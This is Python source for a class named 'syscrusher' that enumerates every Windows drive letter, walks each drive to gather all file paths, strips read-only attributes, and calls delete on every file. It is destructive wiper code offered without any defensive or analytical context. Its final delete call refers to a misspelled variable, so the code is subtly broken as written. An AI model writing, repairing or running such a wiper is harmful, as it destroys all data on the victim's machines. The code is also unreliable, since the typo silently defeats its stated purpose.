import os
import sys
import string
import shutil
import stat
try:
    import win32con
except:
    pass
try:
    import win32api
except:
    pass

class syscrusher:
    def __init__(self):
        self.startdir = str(os.getcwd())
        self.systeminfo = list(os.environ)
    def searchfiles(self):
        def addsymb(x):
            return str(x) + ":\\"
        abjad = list(map( (addsymb),  (list(string.ascii_uppercase)))) 
        drive = []
        self.filess = []
        for aaa in abjad:
            try:
                os.chdir(aaa)
                os.chdir(self.startdir)
                drive.append(aaa)
            except:
                pass
        
        for abc in drive:
            for root, dirs, files in os.walk(abc):
                for cba in files:
                    self.filess.append(os.path.join(root, cba))
            
    def crusher(self):
        for bac in self.filess:
            try:
                win32api.SetFileAttributes(bac, win32con.FILE_ATTRIBUTE_NORMAL)
            except:
                pass
            try:
                os.chmod(bac, stat.S_IWRITE)
            except:
                pass
            try:
                os.remove(bca)
            except:
                pass
                
            
        